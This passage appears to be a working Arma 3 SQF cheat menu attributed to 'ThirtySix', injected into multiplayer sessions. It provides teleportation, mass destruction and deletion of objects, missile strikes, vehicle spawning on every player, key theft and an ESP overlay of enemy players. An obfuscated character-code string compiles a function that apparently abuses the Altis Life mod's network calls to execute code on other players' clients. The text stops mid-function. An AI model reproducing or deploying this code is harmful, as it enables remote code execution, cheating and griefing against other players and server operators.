check_load = 0;
if (isNil("already_load")) then {
    already_load = 1;
    einfg = (findDisplay 46) displayAddEventHandler["KeyDown", {
        if ((_this select 1) == 210) then {
            if (check_load == 0) then {
                ["TaskSucceeded", ["", "Hack Loaded - by ThirtySix"]] call BIS_fnc_showNotification;
                _AllUnits = playableUnits;
                _CountAllUnits = count _AllUnits;
                hint format["\n\n Menu by ThirtySix Loaded! \n\n - Player - List - \n  \n - Made by ThirtySix - \n  \n ----------------------------------------------- \n User Online: \n %1 \n ----------------------------------------------- \n Current Loaded: \n %1 \n ----------------------------------------------- \n\n F2 = Instant Disconnect \n F3 = Switch view to Player\n F5 = Instant Heal / Repair \n Yellow Features are Risky! \n ", _CountAllUnits];
                check_load = 1;
                call init_main;
            };
        }
    }];
    entf = (findDisplay 46) displayAddEventHandler["KeyDown", {
        if ((_this select 1) == 211) then {
            if (check_load == 0) then {
                ["TaskSucceeded", ["", "Script executed"]] call BIS_fnc_showNotification;
                execvm "_src\test.sqf";
                check_load = 1;
            };
        }
    }];
    f1 = (findDisplay 46) displayAddEventHandler["KeyDown", {
        if ((_this select 1) == 59) then {
            hint "F1 does not have a function!";
        }
    }];
    f2 = (findDisplay 46) displayAddEventHandler["KeyDown", {
        if ((_this select 1) == 60) then {
            endMission 'LOSER';
        }
    }];
    f3 = (findDisplay 46) displayAddEventHandler["KeyDown", {
        if ((_this select 1) == 61) then {
            c_player setDamage 100;
            objNull remoteControl _x;
            player switchCamera "EXTERNAL";
            hint "Switched back \n by ThirtySix";
        }
    }];
    f5 = (findDisplay 46) displayAddEventHandler["KeyDown", {
        if ((_this select 1) == 63) then {
            cursorTarget setDamage 0;
            cursorTarget setFuel 1;
            player setDamage 0;
            vehicle player setDamage 0;
            vehicle player setFuel 1;
            Dummy setDamage 0;
            vehicle Dummy setDamage 0;
            vehicle Dummy setFuel 1;
            hint "You and Target Healed \n by ThirtySix";
        }
    }];
    player addEventHandler["respawn", {
        player addAction["Load", {
            removeallactions player;
            player addAction["Load", {
                call init_main;
            }];
        }];
    }];
    init_main = {
        removeallactions player;
        onMapSingleClick "";
        player addAction["<t color='#FF0000'>Made by ThirtySix</t>", {
            preload = nil;
            removeallactions player;
            player addAction["Load", {
                call init_main;
            }];
        }, "", 50];
        player addAction["<t color='#000000'>----------------------</t>", {
            removeallactions player;
            player addAction["Load", {
                call init_main;
            }];
        }, "", 50];
        player addAction["Main Menu", "[]call MainMenubyThirtySix", "", 50];
        player addAction["Equipment", "[]call EquipmentMenubyThirtySix", "", 50];
        player addAction["Vehicles", "[]call VehicleMenubyThirtySix", "", 50];
        player addAction["Target", "[]call TargetMenubyThirtySix", "", 50];
        player addAction["Extras", "[]call ExtrasMenubyThirtySix", "", 50];
        player addAction["Server", "[]call ServerMenubyThirtySix", "", 50];
        player addAction["<t color='#000000'>----------------------</t>", {
            removeallactions player;
            player addAction["Load", {
                call init_main;
            }];
        }, "", 50];
        call compile toString[84, 104, 105, 114, 116, 121, 83, 105, 120, 32, 61, 32, 123, 10, 10, 9, 95, 83, 69, 78, 68, 95, 84, 79, 32, 61, 32, 95, 116, 104, 105, 115, 32, 115, 101, 108, 101, 99, 116, 32, 48, 59, 10, 9, 95, 69, 88, 69, 67, 95, 67, 79, 68, 69, 32, 61, 32, 95, 116, 104, 105, 115, 32, 115, 101, 108, 101, 99, 116, 32, 49, 59, 10, 10, 9, 91, 91, 34, 108, 105, 102, 101, 95, 100, 112, 95, 112, 111, 105, 110, 116, 115, 34, 44, 91, 95, 69, 88, 69, 67, 95, 67, 79, 68, 69, 32, 43, 32, 34, 108, 105, 102, 101, 95, 100, 112, 95, 112, 111, 105, 110, 116, 32, 61, 32, 110, 105, 108, 59, 34, 93, 93, 44, 34, 108, 105, 102, 101, 95, 102, 110, 99, 95, 110, 101, 116, 83, 101, 116, 86, 97, 114, 34, 44, 95, 83, 69, 78, 68, 95, 84, 79, 44, 102, 97, 108, 115, 101, 44, 102, 97, 108, 115, 101, 93, 32, 115, 112, 97, 119, 110, 32, 108, 105, 102, 101, 95, 102, 110, 99, 95, 77, 80, 59, 10, 9, 91, 91, 112, 108, 97, 121, 97, 98, 108, 101, 85, 110, 105, 116, 115, 32, 115, 101, 108, 101, 99, 116, 32, 40, 102, 108, 111, 111, 114, 32, 114, 97, 110, 100, 111, 109, 32, 40, 99, 111, 117, 110, 116, 32, 112, 108, 97, 121, 97, 98, 108, 101, 85, 110, 105, 116, 115, 41, 41, 93, 44, 34, 108, 105, 102, 101, 95, 102, 110, 99, 95, 103, 101, 116, 68, 80, 77, 105, 115, 115, 105, 111, 110, 34, 44, 95, 83, 69, 78, 68, 95, 84, 79, 44, 102, 97, 108, 115, 101, 44, 102, 97, 108, 115, 101, 93, 32, 115, 112, 97, 119, 110, 32, 108, 105, 102, 101, 95, 102, 110, 99, 95, 77, 80, 59, 10, 10, 125, 59];
        MainMenubyThirtySix = {
            removeallactions player;
            player addAction["<t color='#FF0000'>Close Menu</t>", {
                removeallactions player;
                call init_main;
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Destroy Target", {
                _dt = cursorTarget;
                cursorTarget setDamage 100;
                hint format["%1 \n Damaged \n by ThirtySix", _dt];
            }, "", 50];
            player addAction["Delete Target", {
                _dt = cursorTarget;
                deleteVehicle cursorTarget;
                hint format["%1 \n Deleted \n by ThirtySix", _dt];
            }, "", 50];
            player addAction["Destroy all in Range", {
                _l = position player nearObjects 500;
                _cl = count _l;
                _sl = 0;
                for "_sl"
                from 0 to _cl do {
                    _tl = _l select _sl;
                    if (getPlayerUID _tl == "") then {
                        if (_cl == _sl + 1) then {
                            _tl = "Done";
                        };
                        hint format[" \n - Destroy - List - \n  \n - Made by ThirtySix - \n  \n ----------------------------------------------- \n Units in Range: \n %1 \n ----------------------------------------------- \n Current Selected: \n %2 \n %3 \n ----------------------------------------------- \n DESTROYED ", _cl, _sl + 1, _tl];
                        _tl SetDamage 100;
                    };
                };
            }, "", 50];
            player addAction["Delete all in Range", {
                _l = position player nearObjects 500;
                _cl = count _l;
                _sl = 0;
                for "_sl"
                from 0 to _cl do {
                    _tl = _l select _sl;
                    if (getPlayerUID _tl == "") then {
                        if (_cl == _sl + 1) then {
                            _tl = "Done";
                        };
                        hint format[" \n - Delete - List - \n  \n - Made by ThirtySix - \n  \n ----------------------------------------------- \n Units in Range: \n %1 \n ----------------------------------------------- \n Current Selected: \n %2 \n %3 \n ----------------------------------------------- \n DELETED ", _cl, _sl + 1, _tl];
                        deleteVehicle _tl;
                    };
                };
            }, "", 50];
            player addAction["Teleport", {
                openMap[true, false];
                onMapSingleClick '_pos1 = [(_pos select 0), (_pos select 1), 0]; vehicle player setPos _pos1;hint format [ "%1 \n was teleported to \n %2 \n by ThirtySix", name player, _pos1] onMapSingleClick "";openMap [false, false];';
            }, "", 50];
            player addAction["Missle", {
                meins = 0;
                mein1 = {
                    openMap[false, false];
                    [_pos] spawn {
                        for '_l39'
                        from 0 to meins do {
                            _l87 = "M_AT";
                            _l88 = [_this select 0 select 0, _this select 0 select 1, (_this select 0 select 2) + 200];
                            _l89 = createVehicle[_l87, _l88, [], 0, "CAN_COLLIDE"];
                            _l89 setvelocity[0, 0, 0];
                            [_l89, -90, 0] call BIS_fnc_setPitchBank;
                            hint format["Missile Launched \n by ThirtySix", _l39];
                            uiSleep(random 1.00);
                        };
                    };
                };
                titleText["Click on map drop missle's", "PLAIN"];
                titlefadeout 7;
                onMapSingleClick "_pos call mein1;";
                openMap[true, false];
            }, "", 50];
            player addAction["Airstrike", {
                meins = 1000;
                mein1 = {
                    openMap[false, false];
                    [_pos] spawn {
                        for '_l39'
                        from 0 to meins do {
                            _l87 = "M_AT";
                            _l88 = [_this select 0 select 0, _this select 0 select 1, (_this select 0 select 2) + 200];
                            _l89 = createVehicle[_l87, _l88, [], 0, "CAN_COLLIDE"];
                            _l89 setvelocity[random 1000.00 - 500, random 1000.00 - 500, 0];
                            [_l89, -90, 0] call BIS_fnc_setPitchBank;
                            hint format["Missiles Launched \n by ThirtySix \n %1", _l39];
                            uiSleep(random 0.00001);
                        };
                    };
                };
                titleText["Click on map to drop Airstrike", "PLAIN"];
                titlefadeout 7;
                onMapSingleClick "_pos call mein1;";
                openMap[true, false];
            }, "", 50];
            player addAction["Vehicle <t color='#0000FF'>EMP</t>", {
                [cursorTarget, "vehicle player setFuel 0;"] call ThirtySix;
                hint format["%1 \n Vehicle Stopped \n by ThirtySix", cursorTarget];
            }, "", 50];
            player addAction["HealMe / Car", {
                player setDamage 0;
                vehicle player setDamage 0;
                vehicle player setFuel 1;
                hint "Healed \n by ThirtySix";
            }, "", 50];
            player addAction["Heal / Repair Target", {
                cursorTarget setDamage 0;
                cursorTarget setFuel 1;
            }, "", 50];
            player addAction["Lock / Unlock Target", {
                _vehicle = vehicle player;
                if (_vehicle == player) then {
                    _veh = cursorTarget;
                    _locked = locked _veh;
                    if (_locked == 2) then {
                        _veh setVehicleLock "UNLOCKED";
                        hint "You have unlocked a vehicle";
                    } else {
                        _veh setVehicleLock "LOCKED";
                        hint "You have locked a vehicle";
                    };
                };
                if (_vehicle != player) then {
                    _veh = vehicle player;
                    _locked = locked _veh;
                    if (_locked == 2) then {
                        _veh setVehicleLock "UNLOCKED";
                        hint "You have unlocked a vehicle";
                    } else {
                        _veh setVehicleLock "LOCKED";
                        hint "You have locked a vehicle";
                    };
                };
            }, "", 50];
            player addAction["Get Key Car/Target", {
                hint "You got the Key's \n by ThirtySix";
                life_vehicles set[count life_vehicles, cursorTarget];
                life_vehicles set[count life_vehicles, vehicle player];
            }, "", 50];
        };
        EquipmentMenubyThirtySix = {
            removeallactions player;
            player addAction["<t color='#FF0000'>Close Menu</t>", {
                removeallactions player;
                call init_main;
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Clear Outfit", {
                removeUniform player;
                removeAllWeapons player;
                removeBackpack player;
                removeHeadgear player;
                removeVest player;
                removeHeadgear player;
                player addWeapon 'ItemWatch';
                player addWeapon 'ItemCompass';
                player addWeapon 'ItemGPS';
                player addWeapon 'ItemRadio';
                player addWeapon 'ItemMap';
            }, "", 50];
            player addAction["Civ Outfit", {
                removeUniform player;
                removeAllWeapons player;
                removeBackpack player;
                removeHeadgear player;
                removeVest player;
                removeHeadgear player;
                player addUniform 'U_IG_Guerilla2_3';
                player addHeadgear 'H_Bandanna_khk';
                player addVest 'V_TacVest_oli';
                player addWeapon 'NVGoggles';
                player addWeapon 'Binocular';
                player addWeapon 'G_Shades_Black';
                player addBackpack 'B_Carryall_oli';
                player addWeapon 'ItemGPS';
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Rebel 1 Outfit", {
                removeUniform player;
                removeAllWeapons player;
                removeBackpack player;
                removeHeadgear player;
                removeVest player;
                removeHeadgear player;
                player addUniform 'U_I_CombatUniform_tshirt';
                player addHeadgear 'H_Shemag_olive';
                player addVest 'V_TacVest_oli';
                player addWeapon 'NVGoggles';
                player addWeapon 'Binocular';
                player addWeapon 'G_Shades_Black';
                player addWeapon 'ItemGPS';
            }, "", 50];
            player addAction["Rebel 2 Outfit", {
                removeUniform player;
                removeAllWeapons player;
                removeBackpack player;
                removeHeadgear player;
                removeVest player;
                removeHeadgear player;
                player addUniform 'U_IG_Guerilla2_1';
                player addHeadgear 'h_watchcap_blk';
                player addVest 'V_TacVest_oli';
                player addWeapon 'NVGoggles';
                player addWeapon 'Binocular';
                player addWeapon 'G_Bandanna_shades';
                player addWeapon 'ItemGPS';
            }, "", 50];
            player addAction["Rebel 3 Outfit", {
                removeUniform player;
                removeAllWeapons player;
                removeBackpack player;
                removeHeadgear player;
                removeVest player;
                removeHeadgear player;
                player addUniform 'U_I_G_resistanceLeader_F';
                player addHeadgear 'h_watchcap_blk';
                player addVest 'V_TacVest_oli';
                player addWeapon 'NVGoggles';
                player addWeapon 'Binocular';
                player addWeapon 'G_Bandanna_shades';
                player addWeapon 'ItemGPS';
            }, "", 50];
            player addAction["Ghillie Outfit", {
                removeUniform player;
                removeAllWeapons player;
                removeBackpack player;
                removeHeadgear player;
                removeVest player;
                removeHeadgear player;
                player addUniform 'U_O_GhillieSuit';
                player addHeadgear 'H_Shemag_olive';
                player addVest 'V_TacVest_oli';
                player addWeapon 'NVGoggles';
                player addWeapon 'Binocular';
                player addWeapon 'G_Shades_Black';
                player addWeapon 'ItemGPS';
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Police Outfit", {
                removeUniform player;
                removeAllWeapons player;
                removeBackpack player;
                removeHeadgear player;
                removeVest player;
                removeHeadgear player;
                player addWeapon 'G_Shades_Black';
                player addUniform 'U_Rangemaster';
                player addVest 'V_TacVest_blk';
                player addHeadgear 'h_watchcap_blk';
                player addWeapon 'G_Bandanna_shades';
                player addWeapon 'ItemGPS';
            }, "", 50];
            player addAction["Backpack + Items", {
                player addBackpack 'B_Carryall_oli';
                player addWeapon 'ItemWatch';
                player addWeapon 'ItemCompass';
                player addWeapon 'ItemGPS';
                player addWeapon 'ItemRadio';
                player addWeapon 'ItemMap';
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Pistol", {
                player addMagazines['30Rnd_9x21_Mag', 5];
                player addWeapon 'hgun_P07_snds_F';
            }, "", 50];
            player addAction["PDW", {
                player addMagazines["30Rnd_9x21_Mag", 5];
                player addWeapon 'hgun_PDW2000_F';
                player addPrimaryWeaponItem 'optic_ACO_grn';
            }, "", 50];
            player addAction["MX", {
                removeAllWeapons player;
                removeBackpack player;
                player addBackpack 'B_Carryall_oli';
                (unitBackpack player) addItemCargo['30Rnd_65x39_caseless_mag_Tracer', 5];
                (unitBackpack player) addItemCargo['3Rnd_HE_Grenade_shell', 3];
                (unitBackpack player) addItemCargo['3Rnd_Smoke_Grenade_shell', 3];
                (unitBackpack player) addItemCargo['3Rnd_UGL_FlareWhite_F', 3];
                (unitBackpack player) addItemCargo['3Rnd_UGL_FlareGreen_F', 3];
                (unitBackpack player) addItemCargo['3Rnd_UGL_FlareRed_F', 3];
                (unitBackpack player) addItemCargo['3Rnd_UGL_FlareYellow_F', 3];
                (unitBackpack player) addItemCargo['3Rnd_UGL_FlareCIR_F', 3];
                player addWeapon 'arifle_MX_GL_Hamr_pointer_F';
                player addPrimaryWeaponItem 'muzzle_snds_H';
                player addPrimaryWeaponItem 'optic_Hamr';
            }, "", 50];
            player addAction["MK 20", {
                player addMagazines['30Rnd_556x45_Stanag_Tracer_Green', 5];
                player addWeapon 'arifle_Mk20_F';
                player addPrimaryWeaponItem 'muzzle_snds_H';
                player addPrimaryWeaponItem 'optic_Hamr';
            }, "", 50];
            player addAction["LMG Zafir 150 Rnd", {
                player addMagazines['150Rnd_762x51_Box_Tracer', 5];
                player addWeapon 'LMG_Zafir_pointer_F';
                player addPrimaryWeaponItem 'muzzle_snds_H';
                player addPrimaryWeaponItem 'optic_Hamr';
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Katiba Aco", {
                player addMagazines['30Rnd_65x39_caseless_green', 5];
                player addWeapon 'arifle_Katiba_ACO_F';
            }, "", 50];
            player addAction["ACPC", {
                player addMagazines['9Rnd_45ACP_Mag', 5];
                player addWeapon 'hgun_ACPC2_F';
            }, "", 50];
            player addAction["M320 Sos", {
                player addMagazines['7Rnd_408_Mag', 5];
                player addWeapon 'srifle_LRR_SOS_F';
            }, "", 50];
            player addAction["Ebr Aco", {
                player addMagazines['20Rnd_762x51_Mag', 5];
                player addWeapon 'srifle_EBR_ACO_F';
            }, "", 50];
            player addAction["Rahim Sos", {
                player addMagazines['10Rnd_762x51_Mag', 5];
                player addWeapon 'srifle_DMR_01_SOS_F';
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Sniper DMR 7.62", {
                player addMagazines['10Rnd_762x51_Mag', 5];
                player addWeapon 'srifle_DMR_01_DMS_snds_F';
            }, "", 50];
            player addAction["Sniper LRR 408.", {
                player addMagazines['7Rnd_408_Mag', 5];
                player addWeapon 'srifle_LRR_SOS_F';
            }, "", 50];
            player addAction["Sniper GM6 Lynx", {
                player addMagazines['5Rnd_127x108_APDS_Mag', 5];
                player addWeapon 'srifle_GM6_LRPS_F';
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Launcher AA", {
                player addMagazines['Titan_AA', 5];
                player addWeapon 'launch_Titan_F';
            }, "", 50];
            player addAction["Launcher AT", {
                player addMagazines['Titan_AT', 5];
                player addWeapon 'launch_B_Titan_short_F';
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Local Chest", {
                _cr = "Box_NATO_WpsSpecial_F"
                createVehicle(position player);
                nul = [_cr, 0, true] call fill;
                _cr setpos(position player);
                uiSleep 180; /* uiSleep 3min */
                deletevehicle _cr;
            }, "", 50];
        };
        VehicleMenubyThirtySix = {
            removeallactions player;
            player addAction["<t color='#FF0000'>Close Menu</t>", {
                removeallactions player;
                call init_main;
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Spawn Quadbike", {
                _svtp = createVehicle["B_G_Quadbike_01_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["Spawn Gocart", {
                _svtp = createVehicle["C_Kart_01_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Spawn Hatchback", {
                _svtp = createVehicle["C_Hatchback_01_sport_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["Spawn Offroad", {
                _svtp = createVehicle["C_Offroad_01_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["Spawn SUV", {
                _svtp = createVehicle["C_SUV_01_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["Spawn Truck", {
                _svtp = createVehicle["B_Truck_01_covered_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Spawn Strider", {
                _svtp = createVehicle["I_MRAP_03_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["Spawn Strider HMG", {
                _svtp = createVehicle["I_MRAP_03_hmg_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["Spawn Strider GMG", {
                _svtp = createVehicle["I_MRAP_03_gmg_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["Spawn Hunter", {
                _svtp = createVehicle["B_MRAP_01_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["Spawn Hunter HMG", {
                _svtp = createVehicle["B_MRAP_01_hmg_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["Spawn Hunter GMG", {
                _svtp = createVehicle["B_MRAP_01_gmg_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["Spawn Ifrit", {
                _svtp = createVehicle["O_MRAP_02_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["Spawn Ifrit HMG", {
                _svtp = createVehicle["O_MRAP_02_hmg_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["Spawn Ifrit GMG", {
                _svtp = createVehicle["O_MRAP_02_gmg_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["Spawn Tank", {
                _svtp = createVehicle["B_MBT_01_cannon_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["Spawn Tank2", {
                _svtp = createVehicle["B_MBT_01_mlrs_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Spawn AH9", {
                _svtp = createVehicle["B_Heli_Light_01_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["Spawn AH9 Armed", {
                _svtp = createVehicle["B_Heli_Light_01_armed_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["Spawn Armed Kajaman", {
                _svtp = createVehicle["O_Heli_Attack_02_black_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["Spawn Ghost Hawk", {
                _svtp = createVehicle["B_Heli_Transport_01_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["Spawn Armed Orca", {
                _svtp = createVehicle["O_Heli_Light_02_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["Spawn Commance", {
                _svtp = createVehicle["B_Heli_Attack_01_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Spawn Plane I", {
                _svtp = createVehicle["I_Plane_Fighter_03_CAS_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["Spawn Plane B", {
                _svtp = createVehicle["B_Plane_CAS_01_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["Spawn Plane O", {
                _svtp = createVehicle["O_Plane_CAS_02_F", player modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                _svtp setDir(direction player - 90);
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Plane Jump", {
                deleteVehicle Plane_Jump;
                _wPos = getpos player;
                _side = side player;
                ua_36 = 1;
                ThirtySix_Plane_Jump = [
                    [(_wPos select 0), (_wPos select 1) - 1000, (_wPos select 2) + 700], _dir, 'B_Plane_CAS_01_F', _side
                ] call bis_fnc_spawnvehicle;
                Plane_Jump = ThirtySix_Plane_Jump select 0;
                hint format["%1 \n Spawned \n Taked Control", Plane_Jump]; {
                    _x = player;
                    first = _x;
                    _x = vehicle Plane_Jump;
                    second = _x;
                    secondowner = owner _x;
                }
                foreach playableunits;
                first remotecontrol second;
                vehicle second switchcamera "EXTERNAL";
                hint "Press F3 to switch back \n by ThirtySix";
                Plane_Jump addAction["<t color='#FF0000'> - E5P Markers</t>", {
                    if (isnil("E5P")) then {
                        E5P = 0;
                    };
                    if (E5P == 0) then {
                        E5P = 1;
                        hint "E5P \n by ThirtySix \n ON";
                    } else {
                        E5P = 0;
                        hint "E5P \n by ThirtySix \n OFF";
                    };
                    if (E5P == 1) then {
                        onEachFrame {
                            _l49 = nearestobjects[Plane_Jump, ["CAManBase"], 1500]; {
                                if ((side _x != side player) && (getPlayerUID _x != "") && ((Plane_Jump distance _x) < 1500)) then {
                                    drawIcon3D["", [1, 0, 0, 1], [visiblePosition _x select 0, visiblePosition _x select 1, (getPosATL _x select 2) + 2], 0.1, 0.1, 45, (format["%2 : %1m", round(Plane_Jump distance _x), name _x]), 1, 0.04, "TahomaB"]
                                } else {
                                    if ((getPlayerUID _x != "") && ((Plane_Jump distance _x) < 1500)) then {
                                        drawIcon3D["", [0, 0.5, 1, 1], [visiblePosition _x select 0, visiblePosition _x select 1, (getPosATL _x select 2) + 2], 0.1, 0.1, 45, (format["%2 : %1m", round(Plane_Jump distance _x), name _x]), 1, 0.04, "TahomaB"]
                                    };
                                };
                            }
                            foreach playableUnits;
                        };
                    } else {
                        onEachFrame {
                            nil
                        };
                    };
                }];
                while {
                    alive Plane_Jump
                }
                do {
                    _l25 = primaryWeapon Plane_Jump;
                    _l31 = secondaryWeapon Plane_Jump;
                    Plane_Jump setAmmo[_l25, 999];
                    Plane_Jump setAmmo[_l31, 999];
                    (vehicle Plane_Jump) setVehicleAmmo 1;
                    (vehicle Plane_Jump) setVehicleAmmo 1;
                    uiSleep 0.01;
                };
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Spawn Ifrit (all)", {
                {
                    "O_MRAP_02_gmg_F"
                    createVehicle position _x;
                }
                foreach playableUnits;
            }, "", 50];
            player addAction["Spawn Strider (all)", {
                {
                    "I_MRAP_03_gmg_F"
                    createVehicle position _x;
                }
                foreach playableUnits;
            }, "", 50];
            player addAction["Spawn Tank (all)", {
                {
                    "B_MBT_01_cannon_F"
                    createVehicle position _x;
                }
                foreach playableUnits;
            }, "", 50];
            player addAction["Spawn AH9 (all)", {
                {
                    "B_Heli_Light_01_armed_F"
                    createVehicle position _x;
                }
                foreach playableUnits;
            }, "", 50];
            player addAction["Spawn Plane (all)", {
                {
                    "I_Plane_Fighter_03_CAS_F"
                    createVehicle position _x;
                }
                foreach playableUnits;
            }, "", 50];
        };
        TargetMenubyThirtySix = {
            removeallactions player;
            player addAction["<t color='#FF0000'>Close Menu</t>", {
                removeallactions player;
                call init_main;
            }, "", 50];
            player addAction["<t color='#000000'>----------------------</t>", {
                hint "Menu by ThirtySix";
            }, "", 50];
            player addAction["Create Sniper Dummy at Cursor", {
                deleteVehicle Dummy;
                _wPos = screenToWorld[0.5, 0.5];
                _side = side player;
                ThirtySix_Dummy = [_wPos, _dir, 'I_Spotter_F', _side] call bis_fnc_spawnvehicle;
                Dummy = ThirtySix_Dummy select 0;
                removeAllWeapons Dummy;
                removeBackpack Dummy;
                removeHeadgear Dummy;
                removeVest Dummy;
                removeHeadgear Dummy;
                Dummy addHeadgear 'H_Shemag_olive';
                Dummy addVest 'V_TacVest_oli';
                Dummy addWeapon 'NVGoggles';
                Dummy addWeapon 'Binocular';
                Dummy addWeapon 'G_Shades_Black';
                Dummy addWeapon 'ItemGPS';
                Dummy addBackpack 'B_Carryall_oli';
                Dummy addMagazines['5Rnd_127x108_APDS_Mag', 5];
                Dummy addWeapon 'srifle_GM6_LRPS_F';
                hint format["%1 \n Spawned \n Take Control in 3 seconds", Dummy];
                uiSleep 3; {
                    _x = player;
                    first = _x;
                    _x = vehicle Dummy;
                    second = _x;
                    secondowner = owner _x;
                }
                foreach playableunits;
                first remotecontrol second;
                vehicle second switchcamera "EXTERNAL";
                hint "Press F3 to switch back \n by ThirtySix";
                call Dummy_Menu;
            }, "", 50];
            player addAction["Create Mk20 Dummy at Cursor", {
                deleteVehicle Dummy;
                _wPos = screenToWorld[0.5, 0.5];
                _side = side player;
                ThirtySix_Dummy = [_wPos, _dir, 'I_Soldier_M_F', _side] call bis_fnc_spawnvehicle;
                Dummy = ThirtySix_Dummy select 0;
                removeAllWeapons Dummy;
                removeBackpack Dummy;
                removeHeadgear Dummy;
                removeVest Dummy;
                removeHeadgear Dummy;
                Dummy addHeadgear 'H_Shemag_olive';
                Dummy addVest 'V_TacVest_oli';
                Dummy addWeapon 'NVGoggles';
                Dummy addWeapon 'Binocular';
                Dummy addWeapon 'G_Shades_Black';
                Dummy addWeapon 'ItemGPS';
                Dummy addBackpack 'B_Carryall_oli';
                Dummy addMagazines['30Rnd_556x45_Stanag_Tracer_Green', 5];
                Dummy addWeapon 'arifle_Mk20_F';
                Dummy addPrimaryWeaponItem 'muzzle_snds_H';
                Dummy addPrimaryWeaponItem 'optic_Hamr';
                hint format["%1 \n Spawned \n Take Control in 3 seconds", Dummy];
                uiSleep 3; {
                    _x = player;
                    first = _x;
                    _x = vehicle Dummy;
                    second = _x;
                    secondowner = owner _x;
                }
                foreach playableunits;
                first remotecontrol second;
                vehicle second switchcamera "EXTERNAL";
                hint "Press F3 to switch back \n by ThirtySix";
                call Dummy_Menu;
            }, "", 50];
            player addAction["Create Civ Dummy at Cursor", {
                deleteVehicle Dummy;
                _wPos = screenToWorld[0.5, 0.5];
                _side = side player;
